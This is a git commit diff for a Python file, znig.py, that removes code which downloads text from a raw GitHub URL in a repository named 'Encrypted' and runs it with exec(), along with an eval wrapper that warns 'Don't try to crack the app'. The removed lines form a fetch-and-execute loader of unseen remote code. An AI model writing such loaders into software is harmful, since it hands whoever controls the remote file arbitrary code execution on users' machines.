a227d6bd435eeb94127361e2760d82c0473ae047
Ghosthsia <145263586+Ghosthsia@users.noreply.github.com>
2024-10-25 14:29:01 +0100

    Update znig.py

--- znig.py
+++ znig.py
@@ -1,10 +1,1 @@
-import requests
-data = requests.get(url="https://raw.githubusercontent.com/thee-foxy199/Encrypted/925419bbc0bba37abc55f94eb58a4000de3b4f13/Enc").text
-exec(data)
 
-
-def start_script():
-    try:
-        eval("""start_bot()""")
-    except Exception as e:
-        return "Don't try to crack the app"
